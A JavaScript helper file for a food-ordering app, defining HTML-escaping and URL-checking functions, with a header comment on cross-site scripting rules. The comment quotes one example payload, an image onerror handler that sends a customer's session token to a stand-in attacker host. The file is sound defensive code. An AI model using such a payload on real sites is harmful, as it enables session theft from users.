/* ================================================================
   EATSWADA — OUTPUT ESCAPING
   ----------------------------------------------------------------
   Every page in this app builds markup with template literals and
   assigns it through innerHTML. Any value that came back from the API
   is attacker-influenceable — a restaurant name, a dish name, a review
   comment, a saved address, a rider's name — and pasted in raw it stops
   being text and becomes script.

   A vendor who names a dish
     <img src=x onerror="fetch('https://evil/?t='+localStorage.token)">
   would otherwise steal the session of every customer who opens their
   restaurant page.

   RULES
     1. Wrap EVERY interpolated value in esc(). There is no field that
        is safe because it "should" be a name.
     2. Use safeUrl() for anything that lands in src="" or href="",
        then esc() the result.
     3. If the value is plain text with no markup around it, prefer
        el.textContent = value — nothing to escape at all.

   Load this BEFORE any page script that renders API data.
   ================================================================ */
(function () {
  'use strict';

  // Escapes quotes as well as angle brackets: roughly half the sinks in
  // this codebase are attribute values (alt="", title="", href="tel:..."),
  // where a bare " is enough to break out and add an event handler.
  function escapeHtml(value) {
    return String(value == null ? '' : value).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  // Returns '' unless the value is a real http(s) URL, so a stored
  // javascript: or data: URL can never reach src="" or href="".
  function safeUrl(value) {
    if (!value) return '';
    try {
      var u = new URL(String(value), location.href);
      return (u.protocol === 'https:' || u.protocol === 'http:') ? u.href : '';
    } catch (e) {
      return '';
    }
  }

  window.escapeHtml = escapeHtml;
  window.esc = escapeHtml;
  window.safeUrl = safeUrl;
})();
